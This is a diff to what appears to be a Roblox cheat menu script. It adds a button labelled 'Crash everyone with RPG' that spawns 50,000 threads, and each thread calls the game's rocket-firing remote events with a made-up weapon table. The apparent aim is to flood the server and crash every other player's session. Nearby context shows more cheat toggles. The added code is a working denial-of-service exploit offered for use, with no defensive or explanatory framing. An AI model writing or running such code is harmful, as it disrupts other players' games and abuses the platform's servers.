@@ -1483,6 +1483,39 @@ game:GetService("RunService").Heartbeat:Connect(function()
     end
 end)
 
+WarTycoonBox:AddButton('Crash everyone with RPG', function()
+    local camera, playerName = workspace.Camera, game:GetService("Players").LocalPlayer.Name
+    local repeatCount = 50000
+
+    local function fireRocket()
+        local fireRocketVector = camera.CFrame.LookVector
+        local fireRocketPosition = camera.CFrame.Position
+        game:GetService("ReplicatedStorage").RocketSystem.Events.FireRocket:InvokeServer(
+            fireRocketVector, workspace[playerName].RPG, workspace[playerName].RPG, fireRocketPosition
+        )
+
+        local fireRocketClientTable = {
+            ["expShake"] = {["fadeInTime"] = 0.05, ["magnitude"] = 3, ["rotInfluence"] = {0.4, 0, 0.4}, ["fadeOutTime"] = 0.5, ["posInfluence"] = {1, 1, 0}, ["roughness"] = 3},
+            ["gravity"] = Vector3.new(0, -20, 0), ["HelicopterDamage"] = 450, ["FireRate"] = 15, ["VehicleDamage"] = 350, ["ExpName"] = "RPG",
+            ["RocketAmount"] = 1, ["ExpRadius"] = 12, ["BoatDamage"] = 300, ["TankDamage"] = 300, ["Acceleration"] = 8, ["ShieldDamage"] = 11170,
+            ["Distance"] = 4000, ["PlaneDamage"] = 500, ["GunshipDamage"] = 170, ["velocity"] = 200, ["ExplosionDamage"] = 120
+        }
+
+        local fireRocketClientInstance1 = game:GetService("ReplicatedStorage").RocketSystem.Rockets["RPG Rocket"]
+        local fireRocketClientInstance2 = workspace[playerName].RPG
+        local fireRocketClientInstance3 = workspace[playerName].RPG
+        game:GetService("ReplicatedStorage").RocketSystem.Events.FireRocketClient:Fire(
+            camera.CFrame.Position, camera.CFrame.LookVector, fireRocketClientTable, fireRocketClientInstance1, fireRocketClientInstance2, fireRocketClientInstance3,
+            game:GetService("Players").LocalPlayer, nil, { [1] = camera:FindFirstChild("RPG") }
+        )
+    end
+
+    for i = 1, repeatCount do
+        task.spawn(fireRocket)
+    end
+end)
+
+
 ACSEngineBox:AddToggle("WeaponOnHands", {
     Text = "Weapon In Hands",
     Default = false,
